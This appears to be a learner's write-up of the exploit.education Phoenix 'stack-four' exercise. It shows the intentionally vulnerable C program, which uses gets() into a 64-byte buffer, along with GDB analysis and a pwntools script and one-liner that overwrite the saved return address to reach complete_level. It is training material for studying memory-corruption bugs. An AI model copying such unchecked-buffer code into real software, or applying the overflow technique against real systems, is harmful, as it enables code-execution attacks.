Source

```c
/*
 * phoenix/stack-four, by https://exploit.education
 *
 * The aim is to execute the function complete_level by modifying the
 * saved return address, and pointing it to the complete_level() function.
 *
 * Why were the apple and orange all alone? Because the bananna split.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

# Solution

In this challenge, the main function prints the banner and calls the function `start_level()`
We want to overwrite the return address that gets placed onto the stack, with the address of `complete_level`

The buffer is still 64 bytes long, so we can pad that buffer and append the return address of complete_level()

Much like before, find the address of complete_level so we know where we want it to return to.

![[../res/Pasted image 20230323210945.png]]

In this case, on this VM, its `0x40061d`

![[../res/Pasted image 20230323212156.png]]

I opened it in GDB to check if the buffer is properly sized for 64 bytes.. but its not.
In this case the `sub rsp, 0x50` is actually 80 bytes of space being allocated on the stack for variables. This is  to account for the 64 byte `buffer` and the 8 bytes (64-bit) for the `void * ret` The astute probably notice that this  leaves us with 72 bytes of space for variables, but why is it leaving room for another 8 bytes.. perhaps stack alignment or something like that.

On further inspection, the HINTS section of the instructions indicate that this is indeed the case :
	-   The saved instruction pointer is not necessarily directly after the end of variable allocations – things like compiler padding can increase the size. [Did you know that some architectures may not save the return address on the stack in all cases?](https://en.wikipedia.org/wiki/Link_register)


But if we crash the program within gdb and have a read we should see the exact length we need to overwrite rip:

![[../res/Pasted image 20230323212858.png]]

Now we just plug the proper values into our python script from before:


```python
from pwn import *

# fill up the buffer
out = "A" * 80

# overwrite RBP
out += "B" * 8

#use the p64 function to automatically account for \x and endian-ness, and overwrite the RIP
out += p64(0x40061d)
# print it out
print(out)
```

And in one liner form:

```
python -c 'from pwn import *; out = "A"*80; out += "B"*8; out += p64(0x40061d); print(out)'
```


![[../res/Pasted image 20230323213243.png]]

# Other options / patterns

You could use programs like `pattern_create.rb` and `pattern_offset.rb` to figure these values / padding out for you. But its great to open it a debugger and figure it out for yourself.
GEF itself provides fuzzers/pattern creators to fill this purpose:

Pattern Create
![[../res/Pasted image 20230323213657.png]]

Pattern Offset
![[../res/Pasted image 20230323213817.png]]


